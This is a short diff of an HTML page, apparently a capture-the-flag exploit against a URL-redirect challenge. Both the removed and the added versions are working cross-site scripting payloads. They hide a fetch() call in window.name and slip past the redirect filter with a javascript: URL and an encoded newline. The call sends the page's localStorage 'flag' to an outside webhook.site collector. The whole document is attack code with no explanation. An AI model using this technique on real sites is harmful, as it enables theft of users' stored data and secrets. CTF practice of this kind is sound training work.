@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html>
-<body>
-  <script>
-    window.name = "fetch('https://webhook.site/eb84ac19-a281-4430-a79c-d9637e3b02dc/?flag=' + localStorage.getItem('flag'))";
-    window.location = "https://safe-url.ctfi.ng/?redirect=javascript://cor.team/%0aeval(name)";
-  </script>
-</body>
-</html>
+<script>
+    let payload = "javascript://%0Aeval(name).safe-url.ctfi.ng";
+
+    window.open(
+        "https://safe-url.ctfi.ng/?redirect=" + encodeURIComponent(payload),
+        "fetch('https://webhook.site/eb84ac19-a281-4430-a79c-d9637e3b02dc'+localStorage.getItem(`flag`))"
+    );
+</script>
